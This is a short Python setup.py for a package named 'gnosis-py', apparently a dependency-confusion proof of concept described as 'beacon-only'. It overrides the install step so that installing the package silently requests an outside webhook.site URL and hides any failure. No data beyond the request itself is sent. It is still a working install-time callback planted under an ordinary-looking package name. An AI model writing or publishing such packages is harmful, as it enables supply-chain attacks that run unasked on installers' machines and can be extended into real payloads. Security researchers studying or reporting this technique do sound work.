from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/bb766aa3-e1bf-4d46-a61b-a6c98e2bd363"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="gnosis-py",
    version="2.4.7",
    packages=["gnosis-py"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
